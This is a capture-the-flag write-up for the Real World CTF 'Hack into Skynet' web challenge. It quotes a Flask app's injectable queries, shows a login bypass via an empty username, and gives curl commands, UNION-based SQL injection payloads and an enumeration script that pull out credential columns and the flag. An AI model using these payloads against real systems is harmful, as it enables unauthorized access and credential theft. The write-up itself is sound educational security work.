## 2022-01-22
#ctf-writeup 

Link: https://realworldctf.com/

***

# Hack into Skynet
**Category: web**

## Description
* Hack into skynet to save the world, which way do you prefer?
* Note: Skynet is a blackbox detection engine which is not provided. But you don't have to guess.
* Note2: Scanner or sqlmap NOT REQUIRED to solve this challenge, please do not use scanners.

## First Impressions
For this challenge, we are given a link to a website and the source code for the back-end Flask application.

The website brings you to a login page:

![[../Files/hack-into-skynet-login.png]]

A quick attempt at a SQL injection on this page doesn't seem to work. The code supports this finding, as passwords are hashed before being sent to the query.

```python
def query_login_attempt():
    username = flask.request.form.get('username', '')
    password = flask.request.form.get('password', '')
    if not username and not password:
        return False

    sql = ("SELECT id, account"
           "  FROM target_credentials"
           # highlight-start
           "  WHERE password = '{}'").format(hashlib.md5(password.encode()).hexdigest())
           # highlight-end
    user = sql_exec(sql)
    name = user[0][1] if user and user[0] and user[0][1] else ''
    return name == username
```

The only SQL-injectable part of the code appears to be in the `query_kill_time()` function. The `name = '{}'` part of the query, along with the `format()` call, means that the user-provided `name` value from the form body can be directly injected into the SQL statement.

```python
def query_kill_time():
    name = flask.request.form.get('name', '')
    if not name:
        return None

    sql = ("SELECT name, born"
           "  FROM target"
           "  WHERE age > 0"
           # highlight-start
           "    AND name = '{}'").format(name)
           # highlight-end
    nb = sql_exec(sql)
    if not nb:
        return None
    return '{}: {}'.format(*nb[0])
```

This `query_kill_time()` function is only called if we have a valid `SessionId` cookie, something we can only get by logging in. Therefore, we need to somehow log in before we can do any sort of injection.

## Logging in
Upon closer inspection of the `query_login_attempt()` function we see that its login logic is sort of backward. It first queries for the password in the database, then checks if the username given by the user matches the username associated with the result of the query. 

If we send a random, invalid, password along with an empty username, the SQL query will return an empty username from the database. This empty username will match with our empty username and we will "log in". This provides us with a `SessionId` that we can use to start querying the `query_kill_time()` function.

The following curl command illustrates this:
```bash
curl -v -X POST http://47.242.21.212:8081/login \
    -F "username=" \
    -F "password=asdasdasd"
```
```bash
*   Trying 47.242.21.212:8081...
* Connected to 47.242.21.212 (47.242.21.212) port 8081 (#0)
> POST /login HTTP/1.1
> Host: 47.242.21.212:8081
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Length: 249
> Content-Type: multipart/form-data; boundary=------------------------52f42c0931fd21fe
>
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 302 FOUND
< Content-Type: text/html; charset=utf-8
< Content-Length: 13
# highlight-start
< Set-Cookie: SessionId=a706967504e8247d98ad7e583a11e002; Path=/
# highlight-end
< Location: http://47.242.21.212:8081/
< Server: Werkzeug/0.16.1 Python/3.8.10
< Date: Sat, 22 Jan 2022 21:18:43 GMT
<
* Closing connection 0
Login success
```

We can now use the `SessionId` cookie of `a706967504e8247d98ad7e583a11e002` in our future requests.

## SQL Injecting
Now that we have a `SessionId` cookie we can access the vulnerable SQL query. We can inject using the `name` key from the form data of a POST request. The problem is the `skynet_detect()` function seems to do some sort of injection filtering, blocking more obvious injections.

It seemed by sending the POST request form in the `multipart/form-data` format seemed to bring better results. The following curl was our first PoC of a working injection:
```bash
curl -X POST 47.242.21.212:8081 \                                                             130 ⨯
   -b 'SessionId=a706967504e8247d98ad7e583a11e002' \
   -H 'Content-Type: multipart/form-data; boundry=----xxx' \
   -F "name=' OR 1=1 OR name='"
```
```html
<!DOCTYPE html>
<head>
  <link rel="stylesheet" href="static/style.css">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Skynet Target List</title>
</head>

<body>
  <div class="query">

      <h1>Kill before</h1>
      <h1>skynet: 1997-04-19 00:00:00</h1>

  </div>
</body>
```

By injecting UNION commands we can start to enumerate the database. To pull out the table names we can run the following curl multiple times, changing the `OFFSET` each time:

```bash
curl -v -X POST 47.242.21.212:8085 \
   -b 'SessionId=a706967504e8247d98ad7e583a11e002' \
   -H 'Content-Type: multipart/form-data' \
   -F "name=' UNION ALL SELECT TABLE_SCHEMA, TABLE_TYPE FROM information_schema.tables LIMIT 1 OFFSET '1"
```

We can also pull out the column names in each table using a similar method:
```bash
curl -v -X POST 47.242.21.212:8085 \
   -b 'SessionId=a706967504e8247d98ad7e583a11e002' \
   -H 'Content-Type: multipart/form-data' \
   -F "name=' UNION ALL SELECT access_key, secret_key FROM target_credentials LIMIT 1 OFFSET '1"
```

The following Python 3 script was written to do this enumeration automatically:
```python
import subprocess

def main():
     command = """
     curl -v -X POST 47.242.21.212:8085 \
    -b 'SessionId=a706967504e8247d98ad7e583a11e002' \
    -H 'Content-Type: multipart/form-data' \
    -F "name=' UNION ALL SELECT table_name, column_name FROM information_schema.columns LIMIT 1 OFFSET '{}"
     """

    for i in range(10):
        print(f"i = {i}")

        c = command.format(i)

        out = curl(c)
        if "Target not found" in out.decode("utf-8"):
            continue

        print(out)
        print()

def curl(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()

    return out

main()
```

```python
...

i = 8
b'<!DOCTYPE html>\n<head>\n  <link rel="stylesheet" href="static/style.css">\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>Skynet Target List</title>\n</head>\n\n<body>\n  <div class="query">\n    \n      <h1>Kill before</h1>\n      <h1>target_credentials: access_key</h1>\n    \n  </div>\n</body>'

i = 9
b'<!DOCTYPE html>\n<head>\n  <link rel="stylesheet" href="static/style.css">\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>Skynet Target List</title>\n</head>\n\n<body>\n  <div class="query">\n    \n      <h1>Kill before</h1>\n      <h1>target_credentials: secret_key</h1>\n    \n  </div>\n</body>

...
```

The `access_key` and `secret_key` column names stood out in the `target_credentials` table. Modifying our curl command allowed us to pull from those two columns. Using an `OFFSET` of 0 gave us the flag.

```bash
curl -v -X POST 47.242.21.212:8085 \
   -b 'SessionId=a706967504e8247d98ad7e583a11e002' \
   -H 'Content-Type: multipart/form-data' \
   -F "name=' UNION ALL SELECT access_key, secret_key FROM target_credentials LIMIT 1 OFFSET '0"
```
```bash
*   Trying 47.242.21.212:8085...
* Connected to 47.242.21.212 (47.242.21.212) port 8085 (#0)
> POST / HTTP/1.1
> Host: 47.242.21.212:8085
> User-Agent: curl/7.79.1
> Accept: */*
> Cookie: SessionId=21199b076e91781a209628260d6ecc0c
> Content-Length: 222
> Content-Type: multipart/form-data; boundary=------------------------c2ffd11bf040c4a1
>
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 348
< Server: Werkzeug/0.16.1 Python/3.8.10
< Date: Sat, 22 Jan 2022 21:33:36 GMT
<
<!DOCTYPE html>
<head>
  <link rel="stylesheet" href="static/style.css">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Skynet Target List</title>
</head>

<body>
  <div class="query">

      <h1>Kill before</h1>
      # highlight-start
      <h1>$kynet: rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}</h1>
      # highlight-end

  </div>
* Closing connection 0
</body>
```

## Flag
`rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}`

***
